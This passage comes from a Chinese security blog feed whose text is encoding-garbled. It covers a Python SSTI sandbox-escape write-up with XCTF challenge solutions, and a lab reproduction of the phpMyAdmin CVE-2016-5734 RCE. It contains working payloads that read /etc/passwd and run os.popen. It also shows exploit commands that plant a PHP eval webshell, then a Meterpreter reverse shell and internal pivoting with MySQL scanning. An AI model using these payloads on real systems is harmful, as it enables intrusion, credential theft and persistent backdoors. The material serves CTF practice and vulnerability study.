&#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;nt.ScandirIterator&#x27;&gt;, &lt;class &#x27;nt.DirEntry&#x27;&gt;, &lt;class &#x27;PyHKEY&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;]</span><br></pre></td></tr></table></figure><h4 id="4ã€åˆ©ç”¨æ–¹å¼"><a href="#4ã€åˆ©ç”¨æ–¹å¼" class="headerlink" title="4ã€åˆ©ç”¨æ–¹å¼"></a>4ã€åˆ©ç”¨æ–¹å¼</h4><p>ç»¼ä¸Šï¼Œæ²™ç›’é€ƒé€¸çš„åˆ©ç”¨æ–¹å¼å¯å½’çº³ä¸ºä»¥ä¸‹æµç¨‹ï¼š</p><ul><li><strong>å˜é‡ -&gt; å¯¹è±¡ -&gt; ç±» -&gt; åŸºç±» -&gt; æ‰€æœ‰å­ç±» -&gt; å‡½æ•°æ–¹æ³•</strong></li></ul><p>ä»¥è¯»å–æ–‡ä»¶ä¸ºä¾‹ï¼ŒPython2ä¸­è¯»å–æ–‡ä»¶åœ¨<code>file</code>ç±»ä¸­ï¼Œè€Œpython3ä¸­å–æ¶ˆäº†è¯¥ç±»ï¼Œåˆ†åˆ«æ¼”ç¤ºï¼š</p><p><strong>python2ï¼šåˆ©ç”¨fileç±»ä¸­çš„readæ–¹æ³•</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List&#x27;</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶fileç±»ä¸­è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼Œæ¯”å¦‚<code>readline()ã€write()</code>ç­‰éƒ½å¯ä»¥åˆ©ç”¨ï¼ŒæŸ¥çœ‹fileç±»çš„å†…ç½®å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(file.__dict__): print(i)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">(<span class="number">0</span>, <span class="string">&#x27;softspace&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;encoding&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;xreadlines&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;readlines&#x27;</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="string">&#x27;flush&#x27;</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">&#x27;close&#x27;</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="string">&#x27;seek&#x27;</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="string">&#x27;__init__&#x27;</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="string">&#x27;newlines&#x27;</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="string">&#x27;__setattr__&#x27;</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="string">&#x27;errors&#x27;</span>)</span><br><span class="line">(<span class="number">11</span>, <span class="string">&#x27;__new__&#x27;</span>)</span><br><span class="line">(<span class="number">12</span>, <span class="string">&#x27;readinto&#x27;</span>)</span><br><span class="line">(<span class="number">13</span>, <span class="string">&#x27;__enter__&#x27;</span>)</span><br><span class="line">(<span class="number">14</span>, <span class="string">&#x27;next&#x27;</span>)</span><br><span class="line">(<span class="number">15</span>, <span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">(<span class="number">16</span>, <span class="string">&#x27;closed&#x27;</span>)</span><br><span class="line">(<span class="number">17</span>, <span class="string">&#x27;tell&#x27;</span>)</span><br><span class="line">(<span class="number">18</span>, <span class="string">&#x27;mode&#x27;</span>)</span><br><span class="line">(<span class="number">19</span>, <span class="string">&#x27;__exit__&#x27;</span>)</span><br><span class="line">(<span class="number">20</span>, <span class="string">&#x27;isatty&#x27;</span>)</span><br><span class="line">(<span class="number">21</span>, <span class="string">&#x27;truncate&#x27;</span>)</span><br><span class="line">(<span class="number">22</span>, <span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">(<span class="number">23</span>, <span class="string">&#x27;__getattribute__&#x27;</span>)</span><br><span class="line">(<span class="number">24</span>, <span class="string">&#x27;__iter__&#x27;</span>)</span><br><span class="line">(<span class="number">25</span>, <span class="string">&#x27;readline&#x27;</span>)</span><br><span class="line">(<span class="number">26</span>, <span class="string">&#x27;fileno&#x27;</span>)</span><br><span class="line">(<span class="number">27</span>, <span class="string">&#x27;writelines&#x27;</span>)</span><br><span class="line">(<span class="number">28</span>, <span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">(<span class="number">29</span>, <span class="string">&#x27;__doc__&#x27;</span>)</span><br><span class="line">(<span class="number">30</span>, <span class="string">&#x27;__delattr__&#x27;</span>)</span><br><span class="line">(<span class="number">31</span>, <span class="string">&#x27;__repr__&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>python3ï¼šæ²¡æœ‰fileç±»ï¼Œåˆ©ç”¨å†…ç½®å‡½æ•°open()æ¥è¯»å–æ–‡ä»¶</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&quot;open&quot;</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿˜æœ‰å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶å†™å…¥ç­‰æ“ä½œï¼Œåªéœ€è¦æ‰¾åˆ°ç›¸åº”çš„å‡½æ•°æ–¹æ³•å³å¯ï¼Œæ¯”å¦‚<code>os.popen()ã€system()</code>ç­‰</p><h3 id="å››ã€XCTFä¸­SSTIç›¸å…³é¢˜ç›®"><a href="#å››ã€XCTFä¸­SSTIç›¸å…³é¢˜ç›®" class="headerlink" title="å››ã€XCTFä¸­SSTIç›¸å…³é¢˜ç›®"></a>å››ã€XCTFä¸­SSTIç›¸å…³é¢˜ç›®</h3><h4 id="1ã€-Web-python-template-injection"><a href="#1ã€-Web-python-template-injection" class="headerlink" title="1ã€ Web_python_template_injection"></a>1ã€ Web_python_template_injection</h4><p>é¢˜ç›®é¡µé¢æç¤ºä¸ºpythonæ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯ç›´æ¥ç©¿å‚æ²¡æœ‰æ•ˆæœï¼Œå°è¯•è®¿é—®index.phpå‘ç°ä¼šæœ‰not foundæç¤ºï¼Œäºæ˜¯åœ¨index.phpåæ·»åŠ æ¨¡æ¿æ³¨å…¥å‚æ•°ï¼ŒæˆåŠŸè§£æï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898926.png" alt="1603894087160.png"></p><p>å°è¯•è¯»å–flagæ–‡ä»¶æ— æœåï¼Œåˆ©ç”¨å‘½ä»¤æ‰§è¡Œæ¥æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶ï¼Œpayloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagæ–‡ä»¶åï¼šfl4g<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898936.png" alt="1603894436365.png"></p><p>è¯»å–flagï¼Œpayloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;fl4g&quot;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898945.png" alt="1603894611355.png"></p><p>è¿™é“é¢˜ç›®è¿˜ç”¨åˆ°äº† <code>__init__</code>å’Œ<code>__globals__</code></p><ul><li><p> <code>__init__</code> ï¼š ç±»çš„åˆå§‹åŒ–æ–¹æ³• </p></li><li><p><code>__globals__</code> ï¼š å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ </p></li></ul><h4 id="2ã€-easytornado"><a href="#2ã€-easytornado" class="headerlink" title="2ã€ easytornado"></a>2ã€ easytornado</h4><p>é¢˜ç›®é¡µé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶é“¾æ¥ï¼Œåˆ†åˆ«è®¿é—®ï¼š</p><ul><li>flag.txtï¼šæç¤º flag in /fllllllllllllag</li><li>welcome.txtï¼šæç¤º render </li><li>hint.txtï¼šæç¤º md5(cookie_secret+md5(filename)) </li></ul><p>è€Œä¸”è®¿é—®è¯¥æ–‡ä»¶æ—¶ï¼Œurlä¼šå‡ºç°<strong>filename</strong>å’Œ<strong>filehash</strong>å‚æ•°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:46061/file?filename=/hints.txt&amp;filehash=4016066a51c646157d04c91b76864a4d</span><br></pre></td></tr></table></figure><p>ç”±æ­¤æ–­å®šï¼Œéœ€è¦åˆ©ç”¨<strong>fllllllllllllag</strong>æ–‡ä»¶åæ„é€ å¾—åˆ°filehashæ¥è®¿é—®å¾—åˆ°flagï¼›ç”±hintæç¤ºçš„æ„é€ æ–¹æ³•ï¼Œå¾—çŸ¥æ„é€ filehashéœ€è¦<strong>cookie_secret</strong>å˜é‡çš„å€¼ï¼›ç”±welcomeæç¤ºçš„renderä»¥åŠé¢˜ç›®æè¿°Tornadoæ¡†æ¶ï¼Œå¯çŸ¥åœ¨Tornadoä¸­å¯åˆ©ç”¨<strong>handler.settings</strong>è®¿é—®å¾—åˆ°Webå…³é”®å­—å‚æ•°</p><p>ä¿®æ”¹æ–‡ä»¶åä¸ºä¸å­˜åœ¨ï¼Œå¯è§¦å‘erroré¡µé¢ï¼Œmsgå‚æ•°ä¼ å…¥æ¨¡æ¿è§£ææ•°æ®ï¼Œå¾—åˆ°cookie_secret</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898956.png" alt="1603896553708.png"></p><p>åˆ©ç”¨å·²çŸ¥æ•°æ®åŠæ„é€ æ–¹å¼ï¼Œå¾—åˆ°filehashï¼Œè®¿é—®å³å¯å¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:46061/file?filename=/fllllllllllllag&amp;filehash=362f231da5422730e87f8c009eb25f91</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898968.png" alt="1603898335323.png"></p><p>å½“ç„¶åœ¨å®é™…ä¸­ä¼šå¯¹è¾“å…¥åšå®‰å…¨è¿‡æ»¤ï¼Œç»•è¿‡è¿‡æ»¤çš„æ–¹æ³•è¯¦è§è¿™å‡ ä½å¸ˆå‚…çš„åšæ–‡ï¼š</p><p><a href="https://www.cnblogs.com/zaqzzz/p/10263396.html"><strong>https://www.cnblogs.com/zaqzzz/p/10263396.html</strong></a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html"><strong>https://www.cnblogs.com/20175211lyz/p/11425368.html</strong></a></p><h3 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h3><p><a href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/12841941.html">https://www.cnblogs.com/Xyâ€“1/p/12841941.html</a></p><p><a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">https://www.cnblogs.com/20175211lyz/p/11425368.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTIæ¨¡æ¿æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´åˆ†æã€‘CVE-2016-5734 - phpmyadminè¿œç¨‹ä»£ç æ‰§è¡Œ</title>
      <link href="post/20201052133.html"/>
      <url>post/20201052133.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-æ¼æ´å¤ç°"><a href="#0x00-æ¼æ´å¤ç°" class="headerlink" title="0x00 æ¼æ´å¤ç°"></a>0x00 æ¼æ´å¤ç°</h2><p>Dockeræ‹‰å–é•œåƒï¼Œåˆ›å»ºé¶åœºç¯å¢ƒï¼ŒKaliä¸Šæœ‰åˆ©ç”¨è„šæœ¬ï¼Œç›´æ¥æœç´¢å³å¯ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830647.png" alt="image2.png"></p><p>ä½¿ç”¨æ–¹æ³•åœ¨è„šæœ¬ä¸­æœ‰å†™ï¼Œä»¥ä¸‹å‘½ä»¤å³å¯åˆ©ç”¨æ¼æ´è¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="number">40185.</span>py -u root -p root http://<span class="number">192.168</span><span class="number">.11</span><span class="number">.12</span>:<span class="number">8080</span>/ -c <span class="string">&quot;system(&#x27;whoami &amp; uname -a&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­-c è¡¨ç¤ºæ‰§è¡Œçš„phpä»£ç ï¼Œæ­¤å¤„åˆ©ç”¨phpçš„systemå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830669.png" alt="image3.png"></p><p>å¯ä»¥åˆ›å»ºphpæœ¨é©¬æ–‡ä»¶å¹¶å†™å…¥å†…å®¹ï¼Œä»¥phpinfoä¸ºä¾‹ï¼Œæ­¤æ—¶-cå‚æ•°éœ€è¦åˆ©ç”¨**file_put_contents()**å‡½æ•°æ¥å†™å…¥æ–‡ä»¶ï¼š <code>&quot;file_put_contents(&#39;info.php&#39;,&#39;&lt;?php phpinfo();?&gt;&#39;);&quot;</code></p><p>æˆåŠŸåˆ›å»ºå¹¶è®¿é—®å¹¶è§£æ<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830727.png" alt="image5.png"></p><p>å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼ˆ$ç¬¦å·éœ€è¦åŠ åæ–œæ è½¬ä¹‰ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="number">40185.</span>py -u root -p root http://<span class="number">192.168</span><span class="number">.11</span><span class="number">.12</span>:<span class="number">8080</span>/ -c <span class="string">&quot;file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php @eval(\$_POST[cmd]);?&gt;&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥ï¼ˆéœ€è¦é€‰ç¼–ç æ–¹å¼ï¼Œdefaultä¼šè¿”å›ç©ºï¼‰<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830750.png" alt="image6.png"></p><p>msfvenomç”ŸæˆäºŒè¿›åˆ¶æœ¨é©¬ï¼Œåˆ©ç”¨èšå‰‘ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºï¼Œè™šæ‹Ÿç»ˆç«¯æ“ä½œæœ¨é©¬æ–‡ä»¶ï¼Œèµ‹äºˆå…¶æ‰§è¡Œæƒé™<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830756.png" alt="image7.png"></p><p>Kaliä¸Šç›‘å¬4444ç«¯å£ï¼Œä½¿ç”¨èšå‰‘åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œæœ¨é©¬æ–‡ä»¶ï¼Œå³å¯å»ºç«‹è¿æ¥<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830762.png" alt="image8.png"></p><p>ç»§ç»­è¿›è¡Œç®€å•çš„å†…ç½‘æ¸—é€</p><p>æŸ¥çœ‹å†…ç½‘ç½‘æ®µä¿¡æ¯ï¼š<strong>run get_local_subnets</strong><br>ä¸ºç›®æ ‡ä¸»æœºæ·»åŠ è·¯ç”±ï¼š<strong>run autoroute -s 172.24.0.0/24</strong><br>æŸ¥çœ‹è·¯ç”±è¡¨ï¼š<strong>run autoroute -p</strong><br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830777.png" alt="image9.png"></p><p>backgroundå°†ä¼šè¯åç½®ï¼Œä½¿ç”¨mysqlæ‰«ææ¨¡å—è¿›è¡Œæ‰«æï¼ŒæˆåŠŸå‘ç°å†…ç½‘mysqlæœåŠ¡ä¸»æœº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line">set rhosts 172.24.0.1/24</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830796.png" alt="image10.png"></p><p>å¯è®¾ç½®ç”¨æˆ·åå¯†ç å¯¹å…¶è¿›è¡Œçˆ†ç ´ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å…¶ä»–æ¨¡å—å¯¹å†…ç½‘è¿›è¡Œæ¢æµ‹æ”»å‡»ã€‚</p><p>â€ƒ</p><h2 id="0x01-åŸç†åˆ†æ"><a href="#0x01-åŸç†åˆ†æ" class="headerlink" title="0x01 åŸç†åˆ†æ"></a>0x01 åŸç†åˆ†æ</h2><p>å‚è€ƒç½‘ä¸Šå¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œå¾—çŸ¥æ¼æ´å‡ºè‡ª/libraries/TableSearch.class.phpæ–‡ä»¶ï¼Œå‘ç”Ÿåœ¨ç¬¬1388è¡Œ_getRegexReplaceRows()å‡½æ•°é‡Œçš„preg_replace()æ­£åˆ™æ›¿æ¢å‡½æ•°å¤„ï¼Œpreg_replace()å‡½æ•°çš„ä¸‰ä¸ªå‚æ•°ä¸­ä¸¤ä¸ªå¯æ§ï¼Œä¸€ä¸ªç®€ä»‹å¯æ§ï¼Œå› æ­¤åªè¦æ„é€ ç›¸åº”çš„æ•°æ®å³å¯è§¦å‘RCE</p><p>/libraries/TableSearch.class.phpæ–‡ä»¶çš„_getRegexReplaceRows()å‡½æ•°å¦‚ä¸‹ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830876.png" alt="image11.png"></p><p>éœ€è¦æ„é€ 